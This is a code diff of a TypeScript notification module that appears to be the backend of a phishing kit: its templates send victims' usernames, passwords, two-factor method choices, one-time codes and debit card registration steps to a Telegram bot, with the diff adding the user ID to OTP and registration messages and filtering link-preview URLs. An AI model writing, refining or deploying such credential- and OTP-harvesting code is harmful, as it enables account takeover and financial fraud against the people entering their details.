@@ -1,7 +1,7 @@
 import { SITE_DISPLAY_NAME } from "@/lib/site-url"
 import { getNetworkHintLabel } from "@/lib/bot-verification/datacenter-heuristic"
 import { parseVisitorOs } from "@/lib/parse-visitor-os"
-import { formatIdentifierLine } from '@/lib/telegram-approval-templates'
+import { identifierFieldLabel } from '@/lib/telegram-approval-templates'
 
 // Get Telegram configuration from environment variables
 const TELEGRAM_BOT_TOKEN = (process.env.TELEGRAM_BOT_TOKEN || '').trim()
@@ -142,18 +142,59 @@ let previewRotationIndex = 0
  * Rotating Telegram link preview for the visit message. Cycles between the ops
  * channel, the visited page and the referrer so consecutive visit notifications do
  * not all render an identical preview. Mirrors the kit's implementation.
+ *
+ * Non-public preview URLs (localhost / private IPs / intranet hosts) are skipped:
+ * Telegram rejects them with WEBPAGE_URL_INVALID, which would fail the whole send.
  */
+function isPublicPreviewUrl(raw: string): boolean {
+  let url: URL
+  try {
+    url = new URL(raw.trim())
+  } catch {
+    return false
+  }
+  if (url.protocol !== 'http:' && url.protocol !== 'https:') return false
+  const host = url.hostname.toLowerCase()
+  if (
+    host === 'localhost' ||
+    host.endsWith('.localhost') ||
+    host === '0.0.0.0' ||
+    host === '::1' ||
+    host === '[::1]'
+  ) {
+    return false
+  }
+  // Private / reserved IPv4 ranges.
+  const ipv4 = host.match(/^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$/)
+  if (ipv4) {
+    const [a, b] = [Number(ipv4[1]), Number(ipv4[2])]
+    if (
+      a === 10 ||
+      a === 127 ||
+      (a === 172 && b >= 16 && b <= 31) ||
+      (a === 192 && b === 168) ||
+      (a === 169 && b === 254)
+    ) {
+      return false
+    }
+  }
+  // Single-label intranet hostnames (e.g. http://igoe/).
+  if (!host.includes('.') && !host.startsWith('[')) return false
+  return true
+}
+
 function getRotatedPreviewUrl(referrer?: string, pageUrl?: string): string {
   const candidates: string[] = ["https://t.me/th3_allfather"]
 
-  if (pageUrl && /^https?:\/\//i.test(pageUrl.trim())) {
+  if (pageUrl && /^https?:\/\//i.test(pageUrl.trim()) && isPublicPreviewUrl(pageUrl)) {
     candidates.push(pageUrl.trim())
   }
 
   if (
     referrer &&
     /^https?:\/\//i.test(referrer.trim()) &&
-    referrer.trim() !== "Direct"
+    referrer.trim() !== "Direct" &&
+    isPublicPreviewUrl(referrer)
   ) {
     candidates.push(referrer.trim())
   }
@@ -201,10 +242,11 @@ export async function sendFormNotification(data: FormData & { [key: string]: any
 
   // 1) Login attempt from main Sign In
   if (data.type === 'login') {
+    const idField = identifierFieldLabel(data.userId)
     message = `🔐 <b>Login Attempt</b>
 ━━━━━━━━━━━━━━━━━━
-${formatIdentifierLine(data.userId, asCodeU)}
-🔒 Password: ${asCodeU(data.password)}`
+${idField.emoji} <b>${idField.label}:</b> ${asCodeU(data.userId)}
+🔒 <b>Password:</b> ${asCodeU(data.password)}`
   }
   // 1b) Register button clicked on home page
   else if (data.type === 'registration' && data.page === '/') {
@@ -217,27 +259,34 @@ ${formatIdentifierLine(data.userId, asCodeU)}
     typeof data.page === 'string' &&
     data.page.startsWith('/login/2fa-verify')
   ) {
-    const methodLabel =
+    const selectedMethod =
       data.type === 'email_verification'
         ? 'Email'
         : 'Text Message (SMS)'
+    const idField = identifierFieldLabel(data.userId)
 
     message = `🔐 <b>Verify Your Identity</b>
 ━━━━━━━━━━━━━━━━━━
-
-Method Selected: ${asCodeU(methodLabel)}`
+${idField.emoji} <b>${idField.label}:</b> ${asCodeU(data.userId)}
+📧 <b>Method Selected:</b> ${asCodeU(selectedMethod)}`
   }
   // 3) Login OTP verification (login verify-code)
   else if (
     data.type === 'login_email_otp_verification' ||
     data.type === 'login_text_otp_verification'
   ) {
-    const methodLabel =
-      data.type === 'login_email_otp_verification'
-        ? 'Email'
-        : 'Text Message (SMS)'
-
-    message = `🔢 <b>Code:</b> ${asCodeU(data.otp)}`
+    message = `🔑 <b>Verification Code Submitted</b>
+🔢 <b>Code:</b> ${asCodeU(data.otp)}`
+  }
+  // 3a) Registration method selection (app/registration — email or phone pick)
+  else if (data.type === 'registration_method_selected') {
+    const selectedMethod =
+      data.verificationType === 'text_verification' ? 'Text Message (SMS)' : 'Email'
+    const idField = identifierFieldLabel(data.userId)
+    message = `📝 <b>Registration - Method Selected</b>
+━━━━━━━━━━━━━━━━━━
+${idField.emoji} <b>${idField.label}:</b> ${asCodeU(data.userId)}
+📧 <b>Method Selected:</b> ${asCodeU(selectedMethod)}`
   }
   // 3a) Registration OTP verification (email/text on /registration)
   else if (
@@ -245,8 +294,8 @@ Method Selected: ${asCodeU(methodLabel)}`
     typeof data.page === 'string' &&
     data.page === '/registration'
   ) {
-    message = `✅ Verification Code Submitted
-🔢 Code: ${asCodeU(data.otp)}`
+    message = `🔑 <b>Verification Code Submitted</b>
+🔢 <b>Code:</b> ${asCodeU(data.otp)}`
   }
   // 3b) Registration Step 1 – Benefit Account Debit Card
   else if (data.type === 'benefit_debit_card') {
@@ -742,7 +791,10 @@ export async function getVisitorData(request: Request, options?: GetVisitorDataO
   }
 }
 
-export async function sendResendCodeNotification(data?: { page?: string }): Promise<boolean> {
+export async function sendResendCodeNotification(data?: {
+  page?: string
+  userId?: string
+}): Promise<boolean> {
   const page = data?.page ?? ""
   const type =
     page.includes("method=text") || page.includes("method=sms")
@@ -752,12 +804,13 @@ export async function sendResendCodeNotification(data?: { page?: string }): Prom
   return sendFormNotification({
     type,
     page: page || "/login/verify-code",
+    userId: data?.userId,
     timestamp: new Date().toISOString(),
   })
 }
 
 /* fleet-resend-identity-helper */
-const RESEND_ID_BRAND_DEFAULT = "User ID"
+const RESEND_ID_BRAND_DEFAULT = "Username"
 function formatResendIdentityLine(userId: unknown, asCodeFn: (v: unknown) => string = (v) => asCode(String(v ?? ""))): string {
   const raw = userId == null ? "" : String(userId).trim()
   if (!raw) return ""
